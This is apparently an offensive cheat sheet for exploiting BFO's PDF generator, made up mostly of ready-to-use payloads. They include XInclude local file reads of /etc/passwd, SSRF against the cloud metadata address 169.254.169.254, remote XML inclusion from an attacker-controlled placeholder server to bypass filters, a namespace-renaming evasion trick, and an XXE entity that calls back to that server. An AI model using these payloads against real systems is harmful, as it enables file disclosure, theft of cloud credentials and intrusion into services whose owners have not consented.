# Exploiting BFO's PDF Gen.

# `<pdfset>` with XInclude
### Local File Inclusion / HTTP Response View (SSRF)
Assuming you have the ability to add a `pdfset` or `pdf` element you can potentially load the XML Include namespace with:
```
<pdfset xmlns:xi="http://www.w3.org/2003/XInclude">
OR
<pdf xmlns:xi="http://www.w3.org/2003/XInclude">
```
This should allow you to use the namespace in the document to retrieve *local files* and the response from *HTTP requests*

**Note:** `parse="text"` is probably required for the files you want to retrieve, since they might not be XML.
```
<!-- Local file read -->
<xi:include parse="text" href="file:///etc/passwd" />
<!-- Remote HTTP response read --> 
<xi:include parse="text" href="http://169.254.169.254/latest/meta-data/" />
```

### Bypassing Filtering systems
Assuming you can use the xinclude namespace, you might be able to bypass filtering implementations by referencing a remote XML sheet:
```
<xi:include href="https://{YOUR_SERVER}/test.xml" />
```
When the PDF is generated the xinclude will be used to pull content from the remote location (`{YOUR_SERVER]`) and load it into the document.
**If filtering is in place for the `xmlns:xi` element you can always rename it to `xmlns:xd` or similar and still use it.**
# External Entity Processing El-Classico
Assuming you can add headers before `<pdf>` or `<pdfset>` BFO seems to largely behave similar to most XML parsers so if you want to do classic replace elements you can!
```
<!DOCTYPE replace [<!ENTITY ent SYSTEM "https://{YOUR_SERVER}/callback?"> ]>
<pdf>
	<body>
		&ent;
	</body>
</pdf>
```
